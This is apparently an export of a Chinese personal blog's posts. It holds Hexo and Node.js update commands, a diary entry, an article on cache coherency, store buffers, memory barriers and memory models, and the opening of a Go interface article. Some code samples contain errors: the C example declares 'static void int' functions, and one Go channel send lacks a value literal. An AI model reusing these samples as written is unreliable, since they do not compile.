<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用淘宝源的 cnpm 替换 npm</span></span><br><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line">cnpm install -g cnpm                 <span class="comment"># 升级 npm</span></span><br><span class="line">cnpm cache clean -f                 <span class="comment"># 清除 npm 缓存</span></span><br><span class="line"></span><br><span class="line">===更新 hexo: 进入博客根目录，执行如下命令=== </span><br><span class="line"><span class="comment"># 更新 package.json 中的 hexo 及个插件版本</span></span><br><span class="line">cnpm install -g npm-check           <span class="comment"># 检查之前安装的插件，都有哪些是可以升级的 </span></span><br><span class="line">cnpm install -g npm-upgrade         <span class="comment"># 升级系统中的插件</span></span><br><span class="line">npm-check</span><br><span class="line">npm-upgrade</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新 hexo 及所有插件</span></span><br><span class="line">cnpm update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认 hexo 已经更新</span></span><br><span class="line">hexo -v</span><br></pre></td></tr></table></figure>

<h3 id="升级-node-js"><a href="#升级-node-js" class="headerlink" title="升级 node.js"></a>升级 node.js</h3><p>同理，新主题可能会使用新版 node.js 提供的函数等，用户需要更新自己的 node.js。Unix 系统可以使用 n 模块完成更新：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install npm@latest -g <span class="comment"># 升级 npm 到最新版本</span></span><br><span class="line">sudo npm cache clean -f <span class="comment"># 清楚 npm cache</span></span><br><span class="line">sudo npm install -g n <span class="comment"># 安装 n 模块</span></span><br><span class="line"></span><br><span class="line">sudo n stable <span class="comment"># 安装 node.js 最新的稳定版本</span></span><br><span class="line">sudo n 8.1.2 <span class="comment"># 安装指定的 node.js 版本</span></span><br></pre></td></tr></table></figure>

<p>windows 系统暂不支持 n 模块。可以到 <a href="https://nodejs.org/en/">node.js 官网</a> 去下载合适的 msi 包。</p>
<h2 id="部署到-Coding-Page"><a href="#部署到-Coding-Page" class="headerlink" title="部署到 Coding Page"></a>部署到 Coding Page</h2><p>如何利用 hexo + Github Page 搭建静态博客这个问题已经有很多教程了，但是由于某些众所周知的原因国内用户对 Github Page 的体验并不那么好。这时候 <a href="https://e.coding.net/login">Coding</a> 可以作为 Github 的替代品。以前经常有人吐槽 Coding Page 的服务还比 GitHub Page 还差，但最近两年它被腾讯收购以后特别是对国内用户的服务质量有很大提升。所以比较好的方案是国外流量走 Github，国内流量走 Coding。当然你也可以选择用自己的服务器，不做讨论。这里给出一个知乎上的<a href="https://zhuanlan.zhihu.com/p/111608743?from_voters_page=true">教程</a>。</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>一点小想法</title>
    <url>/2021/05/16/%E4%B8%80%E7%82%B9%E5%B0%8F%E6%83%B3%E6%B3%95/</url>
    <content><![CDATA[<p>关于我在学校摸鱼半年惊坐起，遥望大佬又一年这件事。</p>
<span id="more"></span>

<p>今天我趁毕业设计和辅修结课的事情暂告一段落，到几个朋友的博客转了转，发现不知不觉中大家的生活里又发生了这么多事，而自己上一次更新博客还是四个月前了，顿时羞愧地低下了头。</p>
<h2 id="最近在做些什么"><a href="#最近在做些什么" class="headerlink" title="最近在做些什么"></a>最近在做些什么</h2><p>其实本来这个标题我是想起“最近在忙些什么”，想了想好像也没干啥事，实在称不上忙。四月份以来一直在做毕设，刚开始还觉得有点意思干劲十足，半个月之后新鲜劲儿一过就不耐烦了，随便搞搞应付了事。中间断断续续看了点《Linux高性能服务器编程》，照着别人的代码自己写点小玩具。学习上的事好像就这样了。</p>
<p>生活上也没什么太大变化，依旧是不怎么出去玩，倒不是不想动，只是每次动了出去转转的念头最后关头又突然觉得没什么意思就放弃了，好几次都走到校门口了又折返回来。在学校里刷刷 B 站，看看奈飞，晚上喝点小酒，一天就这么稀里糊涂过去了。说起来最近喜欢上喝威士忌，而且比起波本，调和威士忌更对我胃口。波本总是给我一种家里长辈泡的药酒味，得兑点水才方便入口。</p>
<p>精神方面，这学期以来看了三场 live，分别是帆布小镇+结冰水+温和治疗的拼盘、反光镜和霓虹花园。年初在家里经常听结冰水，所以后来把九连真人的票出了去看他们，没想到现场让我大失所望……主唱气息不足且全程放 program，乐队的控场能力也不行。那场 live 之后好长一段时间里我都不愿意再去听他们的歌了。相比之下反光镜不愧是中国老牌朋克乐队，无论是技术还是带动气氛的能力都出类拨萃，第一次有看 live 看到缺氧的感觉。霓虹花园的现场发挥令人影响深刻，同时带着年轻人火一样的热情。不晚的场地和灯光都很棒。这里还要鞭尸一下 vox，真该好好装修一下了，不然怎么跟不晚这种新秀竞争哟。还看了两本无关技术的书，分别是罗翔老师的《圆圈正义》和加莫夫的《从一到无穷大》。《圆圈正义》从一个法律人的角度解读正义、生命和学习，他认为正义就像是一个绝对的圆，是永远无法达到的，但我们必须保持一颗追求正义的心。这就像一句我一直很喜欢的话：高山仰止，景行行止；虽不能至，心向往之。《从一到无穷大》则是一本充满趣味的科普书，里面巧妙地证明一根线段上的点比全体整数更多这个过程让我大开眼界。说实话感觉自己读的书还是太少了，其实金融经济、历史政治这些内容我都比较感兴趣，但就是静不下心来好好学习。最近想再读一遍《稀缺——我们是如何陷入贫穷与忙碌的》，这本书弗兰克杨在知乎推荐很多次了，里面提出“心智带宽”的概念令我印象深刻。人的注意力是有限的，做了这件事就没有更多的精力去做另一件事，如果能尽早安排好像今天吃什么穿什么之类的琐事就能节省下宝贵的判断力给更重要的东西。当然也不是说吃什么是不重要的，人活一世，口腹之欲是最简单最直接的幸福来源。最好是提前把这段时间想吃的东西定下来。</p>
<p>最近一个月稍微减了下肥，目前为止大概瘦了8斤这样。也没有特意加强运动，关键就是少吃碳水。午餐主食减半 + 晚餐拒绝主食，保持清淡饮食，肉和蛋可以多吃。东亚人被歧视体质不行就是肉蛋奶吃太少了，整天吃那些碳水除了增加患上高血糖的几率别的啥用没有。没东西吃只好多干几碗饭填肚子的时代已经过去了，没必要一顿饭还咔咔造那么多米面包子。</p>
<h2 id="稍微展望一下未来"><a href="#稍微展望一下未来" class="headerlink" title="稍微展望一下未来"></a>稍微展望一下未来</h2><p>还有不到两个月我的学生生涯就要结束了，说实话从身边朋友的情况来看，社畜生活比我想象得要更艰难一点。除了钱以外，孤独和压力也让很多初入社会的应届生如牛负重。背井离乡打工的日子确实不好受，不过我对自己的抗压能力还是比较有信心。总之，放弃幻想，准备战斗！</p>
<p><img src="https://i.loli.net/2021/05/16/v8LQPfKhXlb7mVG.jpg" alt="IMG_20210508_213917.jpg"></p>
]]></content>
      <categories>
        <category>日常</category>
      </categories>
      <tags>
        <tag>闲聊</tag>
      </tags>
  </entry>
  <entry>
    <title>Cache Coherency and Memory Consistency</title>
    <url>/2021/01/20/Cache-Coherency-%E4%B8%8E-Memory-Consistency/</url>
    <content><![CDATA[<p><a href="http://qiuyueqy.com/2020/03/24/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B-%E4%BB%A5Go%E4%B8%BA%E4%BE%8B/">并发编程-以Go为例</a>一文总结了并发编程中常见的两种错误并给出了解决策略。本文旨在从计算机体系的角度分析这两种错误出现的原因。</p>
<span id="more"></span>

<h2 id="缓存一致性-Cache-Coherency"><a href="#缓存一致性-Cache-Coherency" class="headerlink" title="缓存一致性(Cache Coherency)"></a>缓存一致性(Cache Coherency)</h2><p>又称<strong>缓存可见性</strong>，现代计算机存储系统采用了分级架构，每个 CPU 内核有自己的 L1、L2 Cache，相互之间还有一个共享的 L3 Cache，其中 L1 还分为缓存指令的 i-cache(只读)和缓存程序数据的 d-cache，L2、L3 Cache 则不区分指令和程序数据，称为统一缓存(unified cache)。而字节从 Memory 缓存到 Cache 的策略又分为<strong>直接映射</strong>、<strong>全相联</strong>和<strong>组相联</strong>三种，此处不做展开：</p>
<p><img src="https://i.loli.net/2021/01/20/cAnCZgduros1mTY.png" alt="分级架构"></p>
<p>在多核时代，假设有下面这一个场景：</p>
<ol>
<li>CPU0 和 CPU1 在各自的 Cache 有一份内存地址为 0x6324 的值的副本，比如这个位置存放了全局变量 a 的值为 0，CPU0 和 CPU1 各自缓存了一个 0</li>
<li>CPU0 要把 a 的值修改为 1，于是直接在自己的 Cache 里对 a 进行写操作（store）</li>
<li>CPU1 执行读操作（load）读取 a 的值，这时候它读从自家 Cache 里读到的实际上是 a 的过期值（仍为 0）</li>
</ol>
<p>这就是一个由于缓存不一致引发的错误。Cache 设计的最大难点其实在于 Cache 一致性: 即所有 CPU 看到的指定地址的值是一致的。CPU 尝试修改某个地址值时，其它 CPU 可能已有该地址的缓存，甚至可能也在执行修改操作。因此该 CPU 需要先征求其它 CPU 的”同意”，才能执行操作。这需要给各个 CPU 的 Cache Line 加一些标记(状态)，辅以 CPU 之间的通信机制(事件)来完成。这可以通过 MESI 协议来完成。MESI 是以下四个状态的简称：</p>
<ul>
<li>M(modified): 该行刚被 CPU 改过，并且保证不会出现在其它 CPU 的 Cache Line 中。即 CPU 是该行唯一所有者</li>
<li>E(exclusive): 和 M 类似，但是未被修改，即和内存是一致的，CPU 可直接对该行执行修改(修改之后为 modified 状态)。</li>
<li>S(shared): 该行内容至少被一个其它 CPU 共享，因此该 CPU 不能直接修改该行而需要先与其它 CPU 协商，但可以直接读</li>
<li>I(invalidated): 该行为无效行，即为可以被填充的行，前面提到 Cache 策略会优先填充 Invalid 行。</li>
</ul>
<p><img src="https://i.loli.net/2021/01/20/ZKIjdyxQvRimwnC.png" alt="MESI状态机"></p>
<p>MESI 协议足够简单，并且能够满足我们对缓存一致性的需求，它在单个 CPU 对指定地址的反复读写方面有很好的性能表现，但在某个 CPU 尝试修改在其它 CPU Cache Line 中存在的数据时，性能表现非常糟糕。硬件工程师为了追求极致的性能，在 CPU 和L1 Cache 之间又加入一级缓存，我们称之为 store buffer。store buffer 和 L1 Cache 还有点区别，<strong>store buffer只缓存 CPU 的写操作</strong>。store buffer 访问一般只需要 1 个指令周期，这在一定程度上降低了内存写延迟。不管 Cache 是否命中，CPU 都将数据写入 store buffer。store buffer 负责后续以 FIFO 次序写入 L1 Cache。store buffer 一般只有几十个字节，和 L1 Cache相比是小巫见大巫了。</p>
<p><img src="https://i.loli.net/2021/01/20/EUBrteHac7OJhsz.png" alt="store buffer"></p>
<p>当存在 store buffer 的情况下。<strong>针对写操作</strong>，CPU 直接把数据扔给 store buffer。后续 store buffer 负责<strong>以 FIFO 次序写回 L1 Cache</strong>。这会对我们的程序产生什么影响呢？我们来看个例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 代码一</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> r1, r2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="keyword">int</span> <span class="title">thread_cpu0</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        x = <span class="number">1</span>;    <span class="comment">/* A */</span></span><br><span class="line">        r1 = y;   <span class="comment">/* B */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="keyword">int</span> <span class="title">thread_cpu1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        y = <span class="number">1</span>;    <span class="comment">/* C */</span></span><br><span class="line">        r2 = x;   <span class="comment">/* D */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">check_after_assign</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;r1 = %d, r2 = %d\n&quot;</span>, r1, r2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设 thread_cpu0 在 CPU0 上执行，thread_cpu1 在 CPU1 上执行。在多核系统上，我们知道两个函数 4 条操作执行可以互相交错。理论上来我们有以下 6 种组合，3 种结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A-&gt;B-&gt;C-&gt;D</span><br><span class="line">A-&gt;C-&gt;B-&gt;D</span><br><span class="line">A-&gt;C-&gt;D-&gt;B</span><br><span class="line">C-&gt;D-&gt;A-&gt;B</span><br><span class="line">C-&gt;A-&gt;D-&gt;B</span><br><span class="line">C-&gt;A-&gt;B-&gt;D</span><br><span class="line"></span><br><span class="line">r1 = 1, r2 = 1</span><br><span class="line">r1 = 0, r2 = 1</span><br><span class="line">r1 = 1, r2 = 0</span><br></pre></td></tr></table></figure>

<p>当我们考虑 store buffer 时，会是怎样的结果呢？我们就以 A-&gt;C-&gt;B-&gt;D 的执行次序说明问题。当 CPU0 执行 <code>x = 1</code> 时，x的值会被写入 CPU0 的 store buffer。CPU1 指令 <code>y = 1</code> 操作，同样 y 的值会被写入 CPU1 的 store buffer。接下来，<code>r1 = y</code> 执行时，CPU0 读取 y 的值，由于 y 的新值依然在 CPU1 的 store buffer 里面，所以 CPU0 看到 y 的值依然是 0。所以 r1 的值是 0。为什么 CPU0 看到 r1 的值是 0 呢？因为 MESI 只保证缓存一致性，只要值没有被写入 Cache(依然躺在 store buffer 里面)，MESI 就管不着。同样的道理，r2 的值也会是 0。此时我们看到了一个意外的结果。这里有个注意点，虽然 store buffer 主要是用来缓存 CPU 的写操作，但是 CPU 读取数据时也会检查私有 store buffer 是否命中，如果没有命中才会查找 L1 Cache。这主要是为了 CPU 自己看到自己写进 store buffer 的值。所以 CPU0 可以看到 x 值更新，但是 CPU1 不能及时看到 x。同样，CPU1 可以看到y值更新，但是 CPU0 不能及时看到 y。所以，我们经常说“单核乱序对程序员是透明的，只有其他核才会受到乱序影响”。</p>
<h2 id="内存一致性-Memory-Consistency"><a href="#内存一致性-Memory-Consistency" class="headerlink" title="内存一致性(Memory Consistency)"></a>内存一致性(Memory Consistency)</h2><p>内存一致性关注的是多个 CPU 看到多个地址数据的读写次序。到目前为止我们只考虑了 CPU 按照程序顺序执行指令，而实际上为了更好地利用 CPU，CPU 和编译器都可能会对指令进行重排(reordering)：</p>
<ul>
<li>编译期间重排: 编译器在编译期间，可能对指令进行重排，以使其对 CPU 更友好</li>
<li>运行期间重排: CPU 在执行指令的过程中，可能乱序执行以更好地利用流水线</li>
</ul>
<p>以下代码无法保证 A1 一定在 A2 之前执行，同样也无法保证 B1 一定在 B2 之前执行。因为赋值语句和输出语句对应不同变量，编译器可能认为这两个语句的执行顺序是不重要的，所以私自进行了指令重排，同理 CPU 指令流水期间也可能发生重排：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 代码二</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x, y <span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        x = <span class="number">1</span>   <span class="comment">// A1</span></span><br><span class="line">        fmt.Print(<span class="string">&quot;y=&quot;</span>, y, <span class="string">&quot; &quot;</span>) <span class="comment">// A2</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        y = <span class="number">2</span>   <span class="comment">// B1</span></span><br><span class="line">        fmt.Print(<span class="string">&quot;x=&quot;</span>, x, <span class="string">&quot; &quot;</span>) <span class="comment">// B2</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    &lt;- done</span><br><span class="line">    &lt;- done</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="顺序一致性"><a href="#顺序一致性" class="headerlink" title="顺序一致性"></a>顺序一致性</h3><p>顺序一致性保证一个线程中所有操作必须按照代码编写的顺序来执行，也就是说如果上面的的代码满足顺序一致性，就不会出现“后面的指令反而放到前面来执行”的情况了。现代 CPU 为了支持指令重排以提高执行效率，往往只满足“无数据竞争程序的顺序一致性”，即对没有 data race 的程序来说，是满足顺序一致性的(编译器能够分析上下文相关性)，但是在并发环境下，需要程序员通过指令手动去限制指令重排以满足顺序一致性。</p>
<p>值得注意的时，所谓“顺序一致性”是单个线程的要求，不要把它和“竞态”搞混了。</p>
<h2 id="缓存一致性和内存一致性的区别"><a href="#缓存一致性和内存一致性的区别" class="headerlink" title="缓存一致性和内存一致性的区别"></a>缓存一致性和内存一致性的区别</h2><p>缓存一致性主要考虑对于同一内存位置的写操作对于所有的处理器的可见性。理想情况下，我们希望写内存的结果可以立即被所有处理器看到，也就是说写操作后其它处理器的读操作所读到的值都是新值。但事实上，由于层次存储模型的存在，这样的假设由于太强不可能实现。</p>
<p>内存一致性关注对多个内存区域的访问（读和写）的顺序。当然，最理想的情况就是所有指令的执行顺序和程序里写的一模一样（即满足顺序一致性），但事实上这也是不可能的。因为考虑到并行优化，几乎所有平台都会改变指令顺序来提高程序运行速度，这不可避免地会违反一致性原则。前面提到内存访问分两种：读和写，则<strong>违反内存一致性原则的情况可能有 4 种：LoadLoad，LoadStore，StoreStore 和 StoreLoad</strong>。过强的一致性约束会使优化程度极大降低，因此很多平台会选择放弃其中的一种或几种。</p>
<h2 id="什么原因会导致乱序？"><a href="#什么原因会导致乱序？" class="headerlink" title="什么原因会导致乱序？"></a>什么原因会导致乱序？</h2><ol>
<li>Store Buffer 可见性导致的 <code>伪·乱序</code>。指令顺序没有变，但是写入 Store Buffer 的数据没有及时刷新到内存，在其它 CPU 看来好像这个 CPU 发生了“乱序”。</li>
<li>编译器、CPU 指令重排导致的 <code>真·乱序</code>。即后面的指令真的跑到前面去执行了。</li>
</ol>
<h2 id="内存屏障"><a href="#内存屏障" class="headerlink" title="内存屏障"></a>内存屏障</h2><p>限制编译器和 CPU 进行指令重排的方法就是使用<strong>内存屏障（Memory Barrier）</strong>，又称<strong>内存栅栏（Memory Fence）</strong>，它是程序员解决乱序问题的大杀器。内存屏障起到两个作用：</p>
<ol>
<li>强制刷新 store buffer。这样内存屏障之前的所有写操作对屏障之后的指令都是可见的。</li>
<li>阻止此处的指令重排。它后面的读写操作不会乱序到前面的指令之前执行，就像是个屏障一样，不容逾越。但是屏障前面/后面的 load/store 操作怎么乱序就管不着了。</li>
</ol>
<p>对于上文代码二，利用“管道操作”这一同步原语进行同步以后，就能够保证 A1 与 A2，B1 与 B2 的执行顺序了：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 代码三</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x, y <span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"><span class="keyword">var</span> ok = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        x = <span class="number">1</span>   <span class="comment">// A1</span></span><br><span class="line">        ok &lt;- <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">        fmt.Print(<span class="string">&quot;y=&quot;</span>, y, <span class="string">&quot; &quot;</span>) <span class="comment">// A2</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        y = <span class="number">2</span>   <span class="comment">// B1</span></span><br><span class="line">        &lt;-ok</span><br><span class="line">        fmt.Print(<span class="string">&quot;x=&quot;</span>, x, <span class="string">&quot; &quot;</span>) <span class="comment">// B2</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    &lt;- done</span><br><span class="line">    &lt;- done</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际的 CPU 架构中，可能提供多种内存屏障，比如可能分为四种:</p>
<ul>
<li>LoadLoad: 任何该屏障前的读操作都会先于该屏障后的读操作完成</li>
<li>LoadStore: 任何该屏障前的读操作都会先于该屏障后的写操作完成</li>
<li>StoreStore: 任何该屏障前的写操作都会先于该屏障后的写操作完成</li>
<li>StoreLoad: 任何该屏障前的写操作都会先于该屏障后的读操作完成</li>
</ul>
<p>其中 StoreLoad 屏障是保证性最强的，也是开销最大的，所以有些 CPU 能保证每条指令都满足前三种要求，但是 StoreLoad 需要程序员手动利用屏障保证。</p>
<h2 id="内存模型"><a href="#内存模型" class="headerlink" title="内存模型"></a>内存模型</h2><p>根据对内存一致性的的支持不同，处理器被划分为几种不同的内存模型：</p>
<ul>
<li>弱内存模型：如 DEC Alpha。它可能经历所有的四种内存乱序(LoadLoad, LoadStore, StoreLoad, StoreStore)，任何 Load 和 Store 操作都能与任何其它的 Load 或 Store 操作乱序，只要其不改变单线程的行为。</li>
<li>强内存模型：如 X86/64。它使用了 LoadLoad/LoadStore/StoreStore 三种内存屏障，即避免了四种乱序中的三种，仍然保留 StoreLoad 的重排，这种情况需要程序员手动插入屏障来确保程序正确。</li>
<li>顺序一致性模型：最强的一致性，理想中的模型，在这种内存模型中，没有乱序的存在。如今很难找到一个硬件体系结构支持顺序一致性，因为它会严重限制硬件对 CPU 执行效率的优化(对寄存器/Cache/流水线的使用)。</li>
</ul>
<h2 id="什么时候需要考虑一致性？"><a href="#什么时候需要考虑一致性？" class="headerlink" title="什么时候需要考虑一致性？"></a>什么时候需要考虑一致性？</h2><ol>
<li>是否有共享数据？私有数据不存在竞争，也就不存在一致性的问题</li>
<li>共享数据是否可能被多个 CPU 并行访问？如果只有一个 CPU 会访问共享数据（包括读写），也不需要考虑一致性问题</li>
<li>是否有多个共享数据？多个数据之间的读写访问，是否需要保证一定的次序？如果需要保证次序，就需要考虑乱序。如果不 care 访问次序，那就没必要考虑乱序。</li>
</ol>
<p>对开发者而言，<strong>编写并发程序需要关注三个东西: 原子性，可见性和顺序性</strong>：</p>
<ul>
<li>原子性: 尽管在如今大部分平台下，对一个字的数据进行存取(int,指针)的操作本身就是原子性的，但为了更好地跨平台性，通过 atomic 操作来实现原子性是更好的方法，并且不会造成额外的开销。</li>
<li>可见性: 数据同步相关，前面讨论的 CPU Cache 设计主要关注的就是可见性，即同一时刻所有 CPU 看到的某个地址上的值是一致的。<strong>缓存一致性主要解决的就是数据可见性的问题</strong></li>
<li>顺序性: 内存屏障保证屏障前的某些操作必定限于屏障后的操作发生且可见。但屏障前或屏障后的指令，CPU/编译器仍然可以在不改变单线程结果的情况下进行局部重排。每个硬件平台有自己的基础顺序性(强/弱内存模型)</li>
</ul>
<p>对开发者来说，应用程序可以通过封装好的 mutex 完成大部分的并发控制，而无需关注底层用了哪些内存屏障，各平台的内存一致性等细节。但是在使用比 mutex 更底层的同步机制(如atomic, volatile, memory-barrier等)时，就要务必小心。从原子性，可见性，顺序性等方面确保代码执行结果如预期。</p>
<h2 id="阅读资料"><a href="#阅读资料" class="headerlink" title="阅读资料"></a>阅读资料</h2><p><a href="https://www.zhihu.com/column/cpu-cache">高速缓存与一致性</a></p>
<p><a href="https://wudaijun.com/2019/04/cpu-cache-and-memory-model/">Cache一致性和内存模型</a></p>
<p><a href="https://wudaijun.com/2018/09/distributed-consistency/">一致性杂谈</a></p>
<p><a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AD%98%E4%B8%80%E8%87%B4%E6%80%A7%E6%A8%A1%E5%9E%8B">内存一致性模型</a></p>
<p><a href="https://monkeysayhi.github.io/2017/12/28/%E4%B8%80%E6%96%87%E8%A7%A3%E5%86%B3%E5%86%85%E5%AD%98%E5%B1%8F%E9%9A%9C/">一文解决内存屏障</a></p>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>并发编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Go语言底层大冒险之interface</title>
    <url>/2020/12/26/Go%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E5%A4%A7%E5%86%92%E9%99%A9%E4%B9%8Binterface/</url>
    <content><![CDATA[<p>很多现代语言都有“接口”这个概念。接口是为了解耦，即通过引入一个约定的中间层解除上下层之间的高度依赖关系。这东西听着玄乎，用饭馆来举个例子，我们作为顾客通常并不关心菜是怎么做的，只是和厨师有诸如“麻婆豆腐必须是辣的”，“冰淇淋必须是冷的”这样的约定，厨师用自己的方法把这个约定实现就行了。程序设计也是如此。函数 A 可能需要回调形参的某个方法，这个方法是如何实现的并不重要，关键是它实现了 A 的约定，这个约定就是所谓的“接口”。</p>
<p>在 java 中，类需要在定义的时候显示声明实现了某接口。而 Go 不一样，只要结构体实现了某个接口的全部方法，编译器就认为结构体实现了这个接口。这样的设计可能会让人因为害怕在不知不觉中实现了某个接口感到不安，而且也不便于程序员阅读，但是 Go 语言的设计者认为这种情况几乎不会出现，而且从编译器的角度来看显示声明完全是多余的：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Tester <span class="keyword">interface</span> &#123;</span><br><span class="line">    test() <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> I <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// I 实现了 Tester 接口的全部方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(i I)</span> <span class="title">test</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testing&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t Tester = I(<span class="number">2</span>)</span><br><span class="line">    fmt.Println(t.test()) <span class="comment">// I 实现了 Tester 接口的 test() 方法，main 作为调用方不关心 I 是如何实现 test() 的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Go 只在编译期对结构体是否符合某个接口进行检查。具体而言，就在以下三个时刻：</p>
<ol>
<li>变量赋值</li>
<li>传递参数</li>
<li>传递返回值</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Tester <span class="keyword">interface</span>&#123;</span><br><span class="line">    test() <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> I <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(i I)</span> <span class="title">test</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testing&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t Tester = I(<span class="number">1</span>) <span class="comment">// 变量赋值，编译器进行类型检查</span></span><br><span class="line">    echo(t) <span class="comment">// 传递参数，编译器进行类型检查</span></span><br><span class="line">    t = NewI(<span class="number">2</span>) <span class="comment">// 传递返回值，编译器进行类型检查</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewI</span><span class="params">(i <span class="keyword">int</span>)</span> <span class="title">I</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> I(i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">echo</span><span class="params">(t Tester)</span></span> &#123;</span><br><span class="line">    fmt.Println(t.test() + <span class="string">&quot;, pass&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 Go 语言中，任意类型的对象都可以转换为 <code>interface&#123;&#125;</code> 类型，一个误区是因此把 <code>interface&#123;&#125;</code> 当作 C 语言的空指针 <code>void*</code>。但事实上 <code>interface&#123;&#125;</code> 是一个独立的类型，与指针是完全不同的两个概念：</p>
